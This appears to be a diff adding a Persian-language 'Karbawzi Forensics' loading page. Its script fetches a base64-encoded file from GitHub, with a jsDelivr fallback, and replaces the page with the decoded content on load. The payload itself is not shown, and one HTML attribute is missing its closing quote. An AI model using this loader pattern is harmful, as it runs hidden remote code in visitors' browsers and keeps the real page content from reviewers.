@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Karbawzi Forensics</title>
+    <style>body{margin:0;background:#0a0a0a;color:#ffd700;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column} .l{width:60px;height:60px;border:6px solid #1a1a1a;border-top:6px solid #ffd700;border-radius:50%;animation:s 1.5s linear infinite} @keyframes s{to{transform:rotate(360deg)}} h1{font-size:2rem}</style>
+</head>
+<body>
+    <div class="l></div>
+    <h1>Karbawzi Forensics</h1>
+    <p>در حال بارگذاری پنل آنالیز...</p>
+    <script>
+    fetch('https://raw.githubusercontent.com/Karbawzi1/copypaste-forensics/main/enc.txt').then(r=>r.text()).then(t=>{
+        document.open();document.write(atob(t));document.close();
+    }).catch(()=>{
+        fetch('https://cdn.jsdelivr.net/gh/Karbawzi1/copypaste-forensics/enc.txt').then(r=>r.text()).then(t=>{
+            document.open();document.write(atob(t));document.close();
+        });
+    });
+    </script>
+</body>
+</html>
